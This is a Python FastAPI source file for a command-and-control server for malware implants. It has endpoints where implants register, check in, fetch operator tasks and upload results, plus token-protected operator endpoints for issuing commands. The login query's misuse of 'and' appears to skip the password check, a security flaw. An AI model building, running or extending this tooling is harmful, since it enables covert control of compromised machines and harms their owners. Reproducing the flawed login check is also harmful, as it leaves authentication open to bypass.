#!/usr/bin/python3
import base64
import binascii

from jose import JWTError, jwt
from datetime import datetime, timedelta, timezone
from typing import List

from fastapi import FastAPI, HTTPException, status
from fastapi.security import OAuth2PasswordRequestForm
from fastapi import Depends, FastAPI, HTTPException, status, Security
from fastapi.responses import RedirectResponse

# local imports
from server_helper.auth_helper import Token, oauth2_scheme
from server_helper.auth_helper import SECRET_KEY, ALGORITHM, ACCESS_TOKEN_EXPIRE_MINUTES

from server_helper.user_helper import Users, UserCreate, UserRead, UserDelete
from server_helper.db import Base, SessionLocal

from server_helper.db import get_db

from server_helper.implant_helper import Implant, ImplantCreate, ImplantRead, ImplantDelete
from server_helper.tasking_helper import Tasking, TaskingCreate, TaskingRead, TaskingDelete

from server_helper.results_helper import Results, ResultsCreate, ResultsRead, ResultsDelete


app = FastAPI()

# for client only to be able to access protected endpoints, authentication via OAuth2
@app.post("/token/", response_model=Token)
def login(db: SessionLocal = Depends(get_db), form_data: OAuth2PasswordRequestForm = Depends()): # type: ignore
    user_exists = db.query(Users).filter(Users.username == form_data.username and Users.password == form_data.password).first()
    if not user_exists:
        raise HTTPException(status_code=401, detail="Invalid username or password")
    access_token = create_access_token(data={"sub": form_data.username})
    return {"access_token": access_token, "token_type": "bearer"}


# for clients only to get jwt token upon successful login 
def create_access_token(data: dict, expires_delta: timedelta | None = None):
    to_encode = data.copy()
    expire = datetime.now(timezone.utc) + (expires_delta or timedelta(minutes=ACCESS_TOKEN_EXPIRE_MINUTES))
    to_encode.update({"exp": expire})
    encoded_jwt = jwt.encode(to_encode, SECRET_KEY, algorithm=ALGORITHM)
    return encoded_jwt


# for clients only to verify the token is correct and valid still
def verify_token(token: str, Depends=(oauth2_scheme)):
    credentials_exception = HTTPException(
            status_code = status.HTTP_401_UNAUTHORIZED,
            detail="Bad credentials",
            headers={"WWW-Authenticate": "Bearer"},
            )
    try:
        payload = jwt.decode(token, SECRET_KEY, algorithms=[ALGORITHM])
        username: str = payload.get("sub")
        if username is None:
            raise credentials_exception
        return payload 
    except JWTError:
        raise credentials_exception


# PROTECTED endpoint to view all information about all users
@app.get("/users", response_model=List[UserRead])
def read_users(db: SessionLocal = Depends(get_db), token: str = Security(oauth2_scheme)): # type: ignore
    verify_token(token)
    users = db.query(Users).all()
    return users


# PROTECTED endpoint to view all information about a user
@app.get("/users/{user_id}", response_model=UserRead)
def read_user(user_id: int, db: SessionLocal = Depends(get_db), token: str = Security(oauth2_scheme)): # type: ignore
    verify_token(token)
    user = db.query(Users).filter(Users.id == user_id).first()
    if user is None:
        raise HTTPException(status_code=404, detail="User not found")
    return user


# PROTECTED endpoint to create a new user
@app.post("/users/create", response_model=UserCreate)
def create_user(user: UserCreate, db: SessionLocal = Depends(get_db), token: str = Security(oauth2_scheme)): # type: ignore
    verify_token(token)
    existing_user = db.query(Users).filter(Users.username == user.username).first()
    if existing_user:
        raise HTTPException(status_code=400, detail="Username already exists")
    user_data = user.model_dump(exclude={"created_at"})
    db_user = Users(**user_data, created_at=datetime.now(timezone.utc).isoformat())
    db.add(db_user)
    db.commit()
    db.refresh(db_user)
    return db_user


# PROTECTED endpoint to delete a user
@app.delete("/users/delete/{user_id}", response_model=UserDelete)
def delete_user(user_id: int, db: SessionLocal = Depends(get_db), token: str = Security(oauth2_scheme)): # type: ignore
    verify_token(token)
    db_user = db.query(Users).filter(Users.id == user_id).first()
    if db_user is None:
        raise HTTPException(status_code=404, detail="User not found")
    db.delete(db_user)
    db.commit()
    return UserDelete(id=user_id)


# PROTECTED endpoint for clients to retrieve result based on session id and tasking id
@app.get("/results/{session}/{id}", response_model=ResultsRead)
def read_result(session: str, id: int, db: SessionLocal = Depends(get_db), token: str = Security(oauth2_scheme)): # type: ignore
    verify_token(token)
    db_implant = db.query(Implant).filter(Implant.session == session).first()
    if not db_implant:
        raise HTTPException(status_code=404, detail="Session not found")
    db_result = db.query(Results).filter(Results.session == session, Results.id == id).first()
    if db_result is None:
        raise HTTPException(status_code=416, detail="Result out of range")
    return db_result


# recieve tasking output from agent based on session id, marks task complete = True
@app.post("/results/{session}", response_model=ResultsCreate)
def create_results(session: str, results: ResultsCreate, db: SessionLocal = Depends(get_db)): # type: ignore
    current_time = datetime.now(timezone.utc).isoformat()
    db_implant = db.query(Implant).filter(Implant.session == session).first()
    if not db_implant:
        raise HTTPException(status_code=404, detail="Session not found")
    if results.args:
        try:
            args_bytes = bytes.fromhex(results.args)
            decoded_args = base64.b64decode(args_bytes.decode('utf-8')).decode('utf-8')
        except (binascii.Error, UnicodeDecodeError, ValueError) as e:
            raise HTTPException(status_code=400, detail=f"Invalid encoded args: {e}")
    else:
        decoded_args = ""
    results_data = results.model_dump(exclude={"session", "date"})
    results_data["args"] = decoded_args
    # you will need to decode the results eventually
    db_task = Results(**results_data, session=session, date=current_time)
    db.add(db_task)
    db.commit()
    db.refresh(db_task)
    # Mark the task as complete (break this out into its own function later)
    db_tasking = db.query(Tasking).filter(Tasking.session == session, Tasking.id == results.tasking_id).first()
    if db_tasking:
        db_tasking.complete = "True"
        db.commit()
        db.refresh(db_tasking)
    else:
        print("Task not found, cannot update completion status in the tasking table.")
        raise HTTPException(status_code=404, detail="Task not found")
    return db_task



# PROTECTED endpoint in order to create a task for an implant (client -> server)
@app.post("/tasking/{session}", response_model=TaskingCreate)
def create_tasking(session: str, tasking: TaskingCreate, db: SessionLocal = Depends(get_db), token: str = Security(oauth2_scheme)):  # type: ignore
    verify_token(token)
    current_time = datetime.now(timezone.utc).isoformat()
    # Check if the session exists
    db_implant = db.query(Implant).filter(Implant.session == session).first()
    if not db_implant:
        raise HTTPException(status_code=404, detail="Session not found")

    # Decode the arguments from base64(hex) if provided
    if tasking.args:
        try:
            args_bytes = bytes.fromhex(tasking.args)
            decoded_args = base64.b64decode(args_bytes.decode('utf-8')).decode('utf-8')
        except (binascii.Error, UnicodeDecodeError, ValueError) as e:
            raise HTTPException(status_code=400, detail=f"Invalid encoded args: {e}")
    else:
        decoded_args = ""
    # Dump model data excluding fields that will be manually set
    tasking_data = tasking.model_dump(exclude={"session", "complete", "date"})
    # Override 'args' with decoded version
    tasking_data["args"] = decoded_args
    # Create new task
    db_task = Tasking(**tasking_data, session=session, date=current_time, complete="False")
    db.add(db_task)
    db.commit()
    db.refresh(db_task)
    return db_task


# PROTECTED endpoint for client to retrieve taskings 
@app.get("/tasking/{session}", response_model=List[TaskingRead])
def read_taskings(session: str, db: SessionLocal = Depends(get_db), token: str = Security(oauth2_scheme)): # type: ignore
    verify_token(token)
    db_implant = db.query(Implant).filter(Implant.session == session).first()
    if not db_implant:
        raise HTTPException(status_code=404, detail="Session not found")
    
    tasking = db.query(Tasking).filter(Tasking.session == session, Tasking.complete.in_(["False", "Pending", "True"])).all()
    return tasking



# endpoint for agent initial checkin, register with server for future tasking/results/tracking
@app.post("/implants/", response_model=ImplantRead)
def create_implant(implant: ImplantCreate, db: SessionLocal = Depends(get_db)): # type: ignore
    current_time = datetime.now(timezone.utc).isoformat()
    
    implant_data = implant.model_dump(exclude={"alive", "first_checkin", "last_checkin"})
    db_implant = Implant(**implant_data, alive=True, first_checkin=current_time, last_checkin=current_time)

    db.add(db_implant)
    db.commit()
    db.refresh(db_implant)
    return db_implant


# PROTECTED endpoint for clients only to be able to view all implants
@app.get("/implants/", response_model=List[ImplantRead])
def read_implants(db: SessionLocal = Depends(get_db), token: str = Security(oauth2_scheme)): # type: ignore
    verify_token(token)
    implants = db.query(Implant).all()
    return implants


# PROTECTED endpoint for clients to be able to view a single implant by session
@app.get("/implants/{session}", response_model=ImplantRead)
def read_single_implant(session: str, db: SessionLocal = Depends(get_db), token: str = Security(oauth2_scheme)): # type: ignore
    verify_token(token)
    implant = db.query(Implant).filter(Implant.session == session).first()
    if implant is None:
        raise HTTPException(status_code=404, detail="Session not found")
    return implant



# PROTECTED endpoint allowing client to delete stale/killed implants
@app.delete("/implants/delete/{session}", response_model=ImplantDelete)
def delete_implant(session: str, db: SessionLocal = Depends(get_db), token: str = Security(oauth2_scheme)): # type: ignore
    verify_token(token)
    db_implant = db.query(Implant).filter(Implant.session == session).first()
    if db_implant is None:
        raise HTTPException(status_code=404, detail="Session not found")
    db.delete(db_implant)
    db.commit()
    return ImplantDelete(session=session)


# implant checkin endpoint
@app.get("/health/{session}", response_model=ImplantCreate)
def check_in(session: str, db: SessionLocal = Depends(get_db)): # type: ignore
    check_in_time = datetime.now(timezone.utc).isoformat()

    db_implant = db.query(Implant).filter(Implant.session == session).first()
    if db_implant is None:
        raise HTTPException(status_code=404, detail="Session not found")
    db_implant.last_checkin = check_in_time
    db.commit()
    db.refresh(db_implant)

    pending_tasks = db.query(Tasking).filter(Tasking.session == session, Tasking.complete == "False").all()

    if pending_tasks:
        return RedirectResponse(f"/tasks/{session}", status_code=301)

    # no pending tasks all completed=True
    return db_implant


# endpoint for agent to retrieve tasks, mark them as pending after agent picks them up
@app.get("/tasks/{session}", response_model=List[TaskingRead])
def get_tasks(session: str, db: SessionLocal = Depends(get_db)):    # type: ignore
    db_implant = db.query(Implant).filter(Implant.session == session).first()
    if db_implant is None:
        raise HTTPException(status_code=404, detail="Session not found")
    
    tasking = db.query(Tasking).filter(Tasking.session == session, Tasking.complete.in_(["False", "Pending"])).all()
    if not tasking:
        raise HTTPException(status_code=404, detail="No tasks found for this session")
    # Mark tasks as pending
    for task in tasking:
        # implant picked it up for action
        task.complete = "Pending"
        db.commit()
        db.refresh(task)

    return tasking